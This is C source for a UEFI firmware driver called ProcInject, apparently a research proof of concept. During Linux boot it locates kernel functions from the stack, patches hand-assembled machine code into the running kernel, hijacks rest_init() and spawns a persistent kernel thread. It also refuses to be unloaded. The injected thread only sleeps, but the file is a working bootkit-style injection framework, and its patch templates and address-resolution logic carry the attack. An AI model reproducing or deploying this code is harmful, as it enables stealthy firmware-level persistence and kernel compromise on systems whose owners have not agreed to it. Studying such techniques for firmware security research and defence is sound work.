#include "drv.h"
#include "kernel_config.h"
#include "logging.h"
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>

UINT64 *
AsmGetRsp(VOID);

EFI_SYSTEM_TABLE* mSysTable;
//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "ProcInject";

// COM1 port base address
#define COM1_PORT 0x402 // Use QEMU debug console port instead of 0x3F8
#define LSR_OFFSET 5 // Line Status Register
#define LSR_THRE 0x20 // Transmit Holding Register

VOID
EFIAPI
SerialOutByte(
    IN UINT8 c
)
{
    // Poll LSR until THR is empty
    while ((__inbyte(COM1_PORT + LSR_OFFSET) & LSR_THRE) == 0) {
        CpuPause();
    }

    // Write the character to the Data Register
    __outbyte(COM1_PORT, c);
}

VOID
EFIAPI
SerialOutString(
    IN UINT8* Str
)
{
    while (*Str) {
        if (*Str == '\n') {
            SerialOutByte('\r'); // Add carriage return before newline
        }
        SerialOutByte(*Str);
        Str++;
    }
}

//
// Code templates for kernel patching
//

UINT8 printk_banner_template[] = {
    0x50, // push rax
    0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, // mov rdi, <banner>
    0xe8, 0x00, 0x00, 0x00, 0x00,  // call printk
    0x58  // pop rax
};

UINT8 proc_template[] = {
	// thread_name:
	    0x3c, 0x55, 0x45, 0x46, 0x49, 0x3e, 0x00, // "<UEFI>"
	// code starts here:
	    0x57, // push rdi
	// loop1:
		0x48, 0xc7, 0xc7, 0x00, 0x5c, 0x26, 0x05,  // mov rdi, 86400*1000 (1 day)
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, msleep
        0xFF, 0xD0,                                // call msleep(86400*1000)
		0xe9, 0xE8, 0xFF, 0xFF, 0xFF,              // jmp loop1
		0x5f, // pop rdi
		0x48, 0x31, 0xc0, // xor rax,rax
		0xc3  // ret
}; // 37 (0x25) bytes

UINT8 patch_code_2[] = {
	// Code to allocate new kernel thread goes here
/* 0*/	0x57, // push rdi
/* 1*/	0x56, // push rsi
/* 2*/	0x51, // push rcx
/* 3*/	0x52, // push rdx
	// thread_func = __kmalloc(sizeof(proc_template), GPF_KERNEL | GPF_ZERO = 0x400CC0
/* 4*/	0x48, 0xC7, 0xC7, 0x25, 0x00, 0x00, 0x00, // mov rdi, 0x25 (sizeof proc_template)
/* b*/	0x48, 0xC7, 0xC6, 0xC0, 0x0C, 0x40, 0x00, // mov rsi 0x400CC0 (GPF_KERNEL | GPF_ZERO)
/*12*/	0xe8, 0x00, 0x00, 0x00, 0x00,             // call __kmalloc(sizeof(proc_template), GPF_KERNEL | GPF_ZERO)  
	// Copy proc_template into new thread code space, including already fixed-up call to msleep
/*17*/	0x48, 0x89, 0xc7,                         // mov rdi, rax
/*1a*/	0x48, 0x8D, 0x35, 0xBA, 0xFF, 0xFF, 0xFF, // lea rsi, [rip-70] ; start of proc_template
/*21*/	0xFC,                                     // cld
/*22*/	0xB9, 0x25, 0x00, 0x00, 0x00,             // mov ecx, 0x25 ; sizeof(proc_template)
/*27*/	0xF3, 0xA4,                               // rep movsb
	// task = kthread_create_on_node(tfunc, 0, -1, "<UEFI>");
/*29*/	0x48, 0x89, 0xc7,                         // mov rdi, rax
/*2c*/  0x48, 0x83, 0xC7, 0x07,                   // add rdi, 7 (point to the start of the code)
/*30*/	0x48, 0x31, 0xF6,                         // xor rsi, rsi (rsi = 0)
/*33*/	0x48, 0x31, 0xD2,                         // xor rdx, rdx (rdx = 0)
/*36*/	0x48, 0xF7, 0xD2,                         // not rdx (rdx = -1)
/*39*/	0x48, 0x89, 0xC1,                         // mov rcx, rax ("<UEFI>")
/*3c*/	0xe8, 0x00, 0x00, 0x00, 0x00,             // call kthread_create_on_node

	    0x5a, // pop rdx
	    0x59, // pop rcx
	    0x5e, // pop rsi
	    0x5f, // pop rdi
	    0xe8, 0x00, 0x00, 0x00, 0x00, // call complete(&kthreadd_done)
	    0xe9, 0x00, 0x00, 0x00, 0x00  // jmp back into rest_init() code
};

// Configuration and state
INJECT_CONFIG gInjectConfig;

// Runtime state (discovered addresses and pointers)
UINT8 StrBuffer[256]; // For debug messages
UINT8* printk;        // Address of the printk routine in linux kernel
UINT8* __kmalloc;     // Address of the __kmalloc routine in linux kernel
UINT8* msleep;        // Address of the msleep routine in linux kernel
UINT8* kthread_create_on_node; // Address of the kthread_create_on_node routine in linux kernel
UINT8  banner[] = "\001\063ProcInject v0.7\n";
UINT8* destptr;
UINT8* arch_call_rest_init = NULL;
UINT8* rest_init = NULL;
UINT8* complete = NULL;
UINT8* return_from_patch;
UINT8* patch_2;
EFI_EVENT mVirtMemEvt;

#define PUT_FIXUP(cp, addr) *(INT32*)cp = (INT32)(INT64)(addr - (cp + 4))

/**
 * Verify if code pointer matches efi_enter_virtual_mode return address
 * Uses kernel configuration pattern matching
 *
 * @param cp    Code pointer to verify
 * @return TRUE if pattern matches, FALSE otherwise
 */
BOOLEAN
VerifyEfiEnterVirtualMode(UINT8* cp) {
    return VerifyEfiEnterVirtualModePattern(cp, gInjectConfig.KernelConfig);
}

//
// ============================================================================
// Helper Functions for VirtMemCallback
// ============================================================================
//

/**
 * Find efi_enter_virtual_mode return address on the stack
 *
 * Scans the call stack looking for a return address that points to code
 * matching the efi_enter_virtual_mode pattern. This is the key to finding
 * the printk address and subsequently all other kernel functions.
 *
 * @param Rsp               Stack pointer from AsmGetRsp()
 * @param ReturnAddress     Output: Found return address
 * @param ReturnIndex       Output: Stack index where address was found
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindEfiEnterVirtualModeReturnAddr(
    IN  UINT64* Rsp,
    OUT UINT8** ReturnAddress,
    OUT UINTN* ReturnIndex
)
{
    UINTN i;
    UINT8* candidateAddr;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (Rsp == NULL || ReturnAddress == NULL || ReturnIndex == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid parameters to FindEfiEnterVirtualModeReturnAddr");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_DEBUG("Scanning stack for efi_enter_virtual_mode return address (0x28 - 0x48)");

    //
    // Search for the return address into efi_enter_virtual_mode
    // We scan from offset 0x28 to 0x48 on the stack
    //
    for (i = 0x28; i < 0x48; i++) {
        //
        // Check if this looks like a kernel address (high canonical address)
        //
        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
            candidateAddr = (UINT8*)Rsp[i];
            LOG_VERBOSE("Checking stack[0x%x] = 0x%llx", i, candidateAddr);

            //
            // Verify if this address points to the expected code pattern
            //
            if (VerifyEfiEnterVirtualMode(candidateAddr)) {
                *ReturnAddress = candidateAddr;
                *ReturnIndex = i;

                LOG_INFO("Found efi_enter_virtual_mode return address: 0x%llx (stack index 0x%x)",
                        candidateAddr, i);

                status = EFI_SUCCESS;
                LOG_FUNCTION_EXIT(status);
                return status;
            }
        }
    }

    LOG_ERROR(INJECT_ERROR_EEVM_NOT_FOUND,
             "efi_enter_virtual_mode return address not found in stack range");

    status = EFI_NOT_FOUND;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Calculate all kernel function addresses from the discovered printk address
 *
 * Uses the kernel configuration to calculate offsets to other required
 * kernel functions. Also fixes up the msleep call in the proc_template.
 *
 * @param EevmReturnAddr    The efi_enter_virtual_mode return address
 * @return EFI_SUCCESS if successful
 */
EFI_STATUS
CalculateKernelFunctionAddresses(
    IN UINT8* EevmReturnAddr
)
{
    INT32 offset;
    UINT8* cp;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (EevmReturnAddr == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid parameter to CalculateKernelFunctionAddresses");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate printk address from the call instruction
    // The call instruction is at offset 0x10 from the return address
    //
    offset = *(INT32*)(EevmReturnAddr + 0x10);
    printk = (EevmReturnAddr + 0x14) + offset;
    LOG_ADDRESS(LOG_LEVEL_INFO, "printk", printk);

    //
    // Use kernel configuration to calculate other function addresses
    //
    __kmalloc = CalculateKernelAddress(printk,
                                       gInjectConfig.KernelConfig->PrintkToKmalloc);
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "__kmalloc", __kmalloc);

    msleep = CalculateKernelAddress(printk,
                                    gInjectConfig.KernelConfig->PrintkToMsleep);
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "msleep", msleep);

    kthread_create_on_node = CalculateKernelAddress(printk,
                                                    gInjectConfig.KernelConfig->PrintkToKthreadCreateOnNode);
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "kthread_create_on_node", kthread_create_on_node);

    //
    // Fix up the msleep call in our kthread code template
    //
    cp = &proc_template[17];
    *(UINT64*)cp = (UINT64)msleep;
    LOG_DEBUG("Fixed up msleep call in proc_template");

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Install Patch 1: Printk banner message
 *
 * Patches the kernel code immediately before the efi_enter_virtual_mode
 * return address to call printk with our banner message. This allows us
 * to announce ourselves during boot.
 *
 * @param Rsp               Stack pointer
 * @param EevmReturnAddr    The efi_enter_virtual_mode return address
 * @param ReturnIndex       Stack index of the return address
 * @return EFI_SUCCESS if patch installed successfully
 */
EFI_STATUS
InstallPatch1_PrintkBanner(
    IN OUT UINT64* Rsp,
    IN     UINT8* EevmReturnAddr,
    IN     UINTN ReturnIndex
)
{
    UINTN i, j;
    UINT8* cp;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (Rsp == NULL || EevmReturnAddr == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid parameters to InstallPatch1_PrintkBanner");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate destination for patch code
    // We write immediately before the return address in already-executed code
    //
    destptr = EevmReturnAddr - (sizeof(banner) + sizeof(printk_banner_template));
    LOG_DEBUG("Patch 1 destination: 0x%llx", destptr);

    //
    // Copy the banner string
    //
    for (i = 0; i < sizeof(banner); i++) {
        destptr[i] = banner[i];
    }
    LOG_VERBOSE("Copied banner string (%d bytes)", sizeof(banner));

    //
    // Copy the printk call template
    //
    for (j = 0; j < sizeof(printk_banner_template); j++) {
        destptr[i + j] = printk_banner_template[j];
    }
    LOG_VERBOSE("Copied printk template (%d bytes)", sizeof(printk_banner_template));

    //
    // Fix up the addresses in the patched code
    // 1. mov rdi, Message1 (pointer to banner string)
    //
    cp = destptr + (sizeof(banner) + 4);
    *(INT32*)cp = (INT32)(INT64)destptr;
    LOG_VERBOSE("Fixed up banner address");

    //
    // 2. call printk (relative call)
    //
    cp += (4 + 1);
    PUT_FIXUP(cp, printk);
    LOG_VERBOSE("Fixed up printk call");

    //
    // Modify the stack return address to point to our patched code
    //
    Rsp[ReturnIndex] = (UINT64)(destptr + sizeof(banner));
    LOG_DEBUG("Modified stack return address to 0x%llx", Rsp[ReturnIndex]);

    LOG_INFO("Patch 1 installed successfully at 0x%llx", destptr);

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Find arch_call_rest_init address in start_kernel
 *
 * Searches the stack for the start_kernel return address by looking for
 * a sequence of call instructions followed by mfence. The last call before
 * mfence is arch_call_rest_init.
 *
 * @param Rsp                   Stack pointer
 * @param StartIndex            Index to start searching from
 * @param ArchCallRestInit      Output: Address of arch_call_rest_init
 * @param StartKernelRetAddr    Output: start_kernel return address
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindArchCallRestInit(
    IN  UINT64* Rsp,
    IN  UINTN StartIndex,
    OUT UINT8** ArchCallRestInit,
    OUT UINT8** StartKernelRetAddr
)
{
    UINTN i, j;
    UINT8* cp;
    BOOLEAN found;
    INT32 offset;

    if (Rsp == NULL || ArchCallRestInit == NULL || StartKernelRetAddr == NULL) {
        return EFI_INVALID_PARAMETER;
    }

    //
    // Search further up the stack for start_kernel return address
    //
    for (i = StartIndex + 1; i < 0x40; i++) {
        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
            cp = (UINT8*)Rsp[i];
            found = TRUE;

            //
            // Verify this looks like start_kernel by checking for
            // at least 10 consecutive call instructions
            //
            for (j = 0; j < 10; j++) {
                if (*cp != 0xe8) {  // 0xe8 = call opcode
                    found = FALSE;
                    break;
                }
                cp += 5;  // call instruction is 5 bytes
            }

            if (found) {
                *StartKernelRetAddr = (UINT8*)Rsp[i];

                //
                // Skip over remaining call instructions until we find mfence
                //
                while (*cp == 0xe8) {
                    cp += 5;
                }

                //
                // Check for mfence instruction (0x0f 0xae 0xf0)
                //
                if (*cp == 0x0f && *(cp + 1) == 0xae && *(cp + 2) == 0xf0) {
                    //
                    // Back up to the last call instruction (arch_call_rest_init)
                    //
                    cp -= 4;  // Point to offset within call instruction
                    offset = *(INT32*)cp;
                    *ArchCallRestInit = (cp + 4) + offset;

                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
                               "Found start_kernel_retaddr @ 0x%llx\n", *StartKernelRetAddr);
                    SerialOutString(StrBuffer);

                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
                               "arch_call_rest_init = 0x%llx\n", *ArchCallRestInit);
                    SerialOutString(StrBuffer);

                    return EFI_SUCCESS;
                }
                else {
                    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Mfence not found\n");
                    SerialOutString(StrBuffer);
                }
            }
        }
    }

    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Did NOT find start_kernel return addr\n");
    SerialOutString(StrBuffer);

    return EFI_NOT_FOUND;
}

/**
 * Find rest_init and the complete(&kthreadd_done) call within it
 *
 * Analyzes arch_call_rest_init to find rest_init, then locates the
 * complete(&kthreadd_done) call that we need to patch.
 *
 * @param ArchCallRestInit      Address of arch_call_rest_init
 * @param RestInit              Output: Address of rest_init
 * @param CompleteCall          Output: Address of complete() call
 * @param ReturnFromPatch       Output: Address to return to after patch
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindRestInitCompleteCall(
    IN  UINT8* ArchCallRestInit,
    OUT UINT8** RestInit,
    OUT UINT8** CompleteCall,
    OUT UINT8** ReturnFromPatch
)
{
    UINT8* cp;
    INT32 offset;

    if (ArchCallRestInit == NULL || RestInit == NULL ||
        CompleteCall == NULL || ReturnFromPatch == NULL) {
        return EFI_INVALID_PARAMETER;
    }

    cp = ArchCallRestInit;

    //
    // Verify arch_call_rest_init function prologue:
    //   nop (multi-byte)
    //   push rbp
    //   mov rbp, rsp
    //   call rest_init
    //
    if (*cp != 0x0f || *(cp + 5) != 0x55 || *(cp + 6) != 0x48 ||
        *(cp + 7) != 0x89 || *(cp + 8) != 0xe5 || *(cp + 9) != 0xe8) {
        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
                   "Failed to verify arch_call_rest_init prologue\n");
        SerialOutString(StrBuffer);
        return EFI_NOT_FOUND;
    }

    //
    // Extract rest_init address from call instruction
    //
    cp += 10;  // Point to offset within call instruction
    offset = *(INT32*)cp;
    *RestInit = (cp + 4) + offset;

    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "rest_init = 0x%llx\n", *RestInit);
    SerialOutString(StrBuffer);

    //
    // Find the complete(&kthreadd_done) call in rest_init
    // Use kernel configuration for the offset
    //
    cp = *RestInit + gInjectConfig.KernelConfig->RestInitToCompleteOffset;

    //
    // Verify this is a call instruction
    //
    if (*cp != 0xe8) {
        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
                   "Expected call instruction at rest_init+0x%x, found 0x%x\n",
                   gInjectConfig.KernelConfig->RestInitToCompleteOffset, *cp);
        SerialOutString(StrBuffer);
        return EFI_NOT_FOUND;
    }

    *ReturnFromPatch = cp;
    cp++;  // Point to offset
    offset = *(INT32*)cp;
    *CompleteCall = (cp + 4) + offset;

    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "complete = 0x%llx\n", *CompleteCall);
    SerialOutString(StrBuffer);

    return EFI_SUCCESS;
}

/**
 * Install Patch 2: Kernel thread creation
 *
 * Installs the kernel thread creation code that will run after kthreadd
 * is initialized but before the system goes multi-threaded. This is the
 * main payload that creates our persistent thread.
 *
 * @param StartKernelRetAddr    Address in start_kernel to write patch code
 * @param ReturnFromPatch       Address to return to after patch executes
 * @param CompleteCall          Address of complete(&kthreadd_done) function
 * @return EFI_SUCCESS if patch installed successfully
 */
EFI_STATUS
InstallPatch2_KthreadCreate(
    IN UINT8* StartKernelRetAddr,
    IN UINT8* ReturnFromPatch,
    IN UINT8* CompleteCall
)
{
    UINT8* cp;
    UINTN i;

    if (StartKernelRetAddr == NULL || ReturnFromPatch == NULL || CompleteCall == NULL) {
        return EFI_INVALID_PARAMETER;
    }

    //
    // Write the proc_template (thread code + data) immediately before patch_2
    // This goes in already-executed init code that will be reclaimed
    //
    cp = StartKernelRetAddr - (sizeof(patch_code_2) + sizeof(proc_template));
    for (i = 0; i < sizeof(proc_template); i++) {
        *cp++ = proc_template[i];
    }

    //
    // Write the patch_2 code (kthread allocation and creation)
    //
    patch_2 = StartKernelRetAddr - sizeof(patch_code_2);
    cp = patch_2;
    for (i = 0; i < sizeof(patch_code_2); i++) {
        *cp++ = patch_code_2[i];
    }

    //
    // Fix up the call addresses in patch_2
    //

    // 1. call __kmalloc
    cp = patch_2 + 0x13;
    PUT_FIXUP(cp, __kmalloc);

    // 2. call kthread_create_on_node
    cp = patch_2 + 0x3d;
    PUT_FIXUP(cp, kthread_create_on_node);

    // 3. call complete(&kthreadd_done)
    cp = patch_2 + (sizeof(patch_code_2) - 9);
    PUT_FIXUP(cp, CompleteCall);

    // 4. jmp back to rest_init
    cp = patch_2 + (sizeof(patch_code_2) - 4);
    PUT_FIXUP(cp, (ReturnFromPatch + 5));

    //
    // Patch the rest_init() code to jump to our patch_2
    //
    cp = ReturnFromPatch;
    *cp = 0xe9;  // direct near jmp opcode
    cp++;
    PUT_FIXUP(cp, patch_2);

    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Patch 2 installed @ 0x%llx\n", patch_2);
    SerialOutString(StrBuffer);

    return EFI_SUCCESS;
}

/**
 * SetVirtualAddressMap (SVAM) callback
 *
 * This callback is invoked during Linux kernel boot when the system
 * transitions from physical to virtual address mode. At this point,
 * KASLR has already occurred, so we can discover kernel function
 * addresses and install our patches.
 *
 * The callback performs the following steps:
 * 1. Find efi_enter_virtual_mode return address on the stack
 * 2. Calculate kernel function addresses (printk, __kmalloc, etc.)
 * 3. Install Patch 1: Printk banner message
 * 4. Find arch_call_rest_init and rest_init
 * 5. Install Patch 2: Kernel thread creation code
 *
 * @param Event     The event that triggered this callback
 * @param Context   Optional context (unused)
 */
VOID
EFIAPI
VirtMemCallback(
	IN EFI_EVENT Event,
	IN VOID* Context
)
{
	EFI_STATUS efiStatus;
	UINT64* rsp;
	UINT8* eevmReturnAddr;
	UINTN retaddrIndex;
	UINT8* startKernelReturnAddr;
	UINT8* restInitAddr;
	UINT8* completeAddr;
	UINT8* returnFromPatch;

	UNREFERENCED_PARAMETER(Event);
	UNREFERENCED_PARAMETER(Context);

	//
	// Get current stack pointer to search for kernel return addresses
	//
	rsp = AsmGetRsp();
	printk = NULL;

	//
	// Step 1: Find efi_enter_virtual_mode return address
	//
	efiStatus = FindEfiEnterVirtualModeReturnAddr(rsp, &eevmReturnAddr, &retaddrIndex);
	if (EFI_ERROR(efiStatus)) {
		return;  // Failed to find return address
	}

	//
	// Step 2: Calculate kernel function addresses
	//
	efiStatus = CalculateKernelFunctionAddresses(eevmReturnAddr);
	if (EFI_ERROR(efiStatus)) {
		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
		           "Failed to calculate kernel addresses: %r\n", efiStatus);
		SerialOutString(StrBuffer);
		return;
	}

	//
	// Step 3: Install Patch 1 - Printk banner
	//
	efiStatus = InstallPatch1_PrintkBanner(rsp, eevmReturnAddr, retaddrIndex);
	if (EFI_ERROR(efiStatus)) {
		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
		           "Failed to install Patch 1: %r\n", efiStatus);
		SerialOutString(StrBuffer);
		return;
	}

	//
	// Step 4: Find arch_call_rest_init
	//
	efiStatus = FindArchCallRestInit(rsp, retaddrIndex,
	                                 &arch_call_rest_init,
	                                 &startKernelReturnAddr);
	if (EFI_ERROR(efiStatus)) {
		return;  // Failed to find arch_call_rest_init
	}

	//
	// Step 5: Find rest_init and complete(&kthreadd_done) call
	//
	efiStatus = FindRestInitCompleteCall(arch_call_rest_init,
	                                     &restInitAddr,
	                                     &completeAddr,
	                                     &returnFromPatch);
	if (EFI_ERROR(efiStatus)) {
		return;  // Failed to find rest_init or complete call
	}

	rest_init = restInitAddr;
	complete = completeAddr;

	//
	// Step 6: Install Patch 2 - Kernel thread creation
	//
	efiStatus = InstallPatch2_KthreadCreate(startKernelReturnAddr,
	                                        returnFromPatch,
	                                        completeAddr);
	if (EFI_ERROR(efiStatus)) {
		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
		           "Failed to install Patch 2: %r\n", efiStatus);
		SerialOutString(StrBuffer);
		return;
	}

	//
	// All patches installed successfully
	//
	AsciiSPrint(StrBuffer, sizeof(StrBuffer), "All patches installed successfully!\n");
	SerialOutString(StrBuffer);
}

EFI_STATUS
EFIAPI
UefiUnload (
    IN EFI_HANDLE ImageHandle
    )
{
    //
    // Do not allow unload
    //
    return EFI_ACCESS_DENIED;
}

EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    EFI_STATUS efiStatus;

    //
    // Initialize logging system
    // Use DEBUG level for development, INFO for production
    //
    LogInitialize(LOG_LEVEL_DEBUG);

    LOG_INFO("=================================================");
    LOG_INFO("ProcInject v0.7 Starting");
    LOG_INFO("=================================================");

    //
    // Initialize kernel configuration
    //
    efiStatus = InitializeKernelConfig(&gInjectConfig);
    if (EFI_ERROR(efiStatus)) {
        LOG_ERROR(INJECT_ERROR_CONFIG_INVALID,
                 "Failed to initialize kernel configuration: %r", efiStatus);
        Print(L"Failed to initialize kernel configuration: %r\n", efiStatus);
        return efiStatus;
    }

    LOG_INFO("Kernel target: %a", gInjectConfig.KernelConfig->VersionString);
    LOG_INFO("VirtualMemCallback address: 0x%llx", (UINT64)VirtMemCallback);

    Print(L"ProcInject v0.7 - Kernel target: %a\n", gInjectConfig.KernelConfig->VersionString);
    Print(L"VirtualMemCallback = 0x%llx...\n", (UINT64)VirtMemCallback);
    //
    // Install the SetVirtualAddressMap callback
    //
    efiStatus = gBS->CreateEvent(
        EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE,
        TPL_NOTIFY,
        VirtMemCallback,
        NULL,
        &mVirtMemEvt
    );

    //
    // Install required driver binding components
    //
    efiStatus = EfiLibInstallDriverBindingComponentName2(ImageHandle,
                                                         SystemTable,
                                                         &gDriverBindingProtocol,
                                                         ImageHandle,
                                                         &gComponentNameProtocol,
                                                         &gComponentName2Protocol);
    return efiStatus;
}

